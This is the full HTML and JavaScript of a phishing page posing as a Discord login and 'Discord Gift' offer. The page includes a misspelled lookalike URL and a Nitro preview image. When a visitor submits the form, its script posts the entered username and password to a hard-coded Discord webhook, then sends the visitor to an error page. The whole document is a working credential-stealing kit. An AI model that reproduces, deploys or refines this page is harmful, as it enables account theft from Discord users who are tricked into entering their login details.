<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Discord Proxy</title>
    <link rel="stylesheet" href="../assest/style.css"/>
    <meta property="og:site_name" content="Discord Gift">
    <meta property="og:url" content="https://dliscord.">
    <meta property="og:title" content="Discord">
    <meta property="og:description" content="Pleeasseeee work">
    <meta property="og:type" content="Discord">
    <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
  </head>
  <body>
    <center>
      <div class="loginPart">
        <br/><br/><br/>
        We are gonna see if this fuckin works â€” please login.
        <br/><br/><br/>
        <p class="welcome">Welcome Back!</p>
        <br/>
        Email or Phone number:
        <br/>
        <!-- Form submission is handled by JavaScript -->
        <form id="saveForm" onsubmit="handleFormSubmit(event)">
          <input type="text" name="user" id="user" class="inputs" required />
          <br/>
          Password:
          <br/>
          <input type="password" name="pass" id="pass" class="inputs" required />
          <br/><br/>
          <input type="submit" name="submit" value="Login" class="submit"/>
        </form>
      </div>
    </center>
    
    <script>
      // Discord webhook URL (provided)
      const webhookUrl = 'https://discord.com/api/webhooks/1338297079730016389/Wl7ijongjwRC-t8gz5H12JfI3YQMYxI8FnEp7VAtP-e_XgREUzPfzIOZzarrJYkCzftL';
      
      // Placeholder for the client's IP since client-side JS can't reliably fetch it
      const iptoken = "Client_IP";
      
      // Function to handle the form submission
      function handleFormSubmit(event) {
        event.preventDefault(); // Prevent the default form submission (page reload)
        
        // Retrieve the values from the input fields
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        
        // Construct the message to be sent via Discord webhook
        const message = `- IP: ${iptoken}   Username: ${user}   Password: ${pass}`;
        
        // Build the payload for Discord (using the "content" field)
        const payload = {
          content: message
        };

        // Send the data to the Discord webhook using fetch
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        })
        .then(response => {
          if (response.ok) {
            console.log("Message sent to Discord webhook.");
          } else {
            console.error("Error sending message to Discord webhook.");
          }
        })
        .catch(error => {
          console.error("Fetch error:", error);
        })
        .finally(() => {
          // Redirect the user to error.html after attempting to send the data
          window.location.href = "error.html";
        });
      }
    </script>
  </body>
</html>
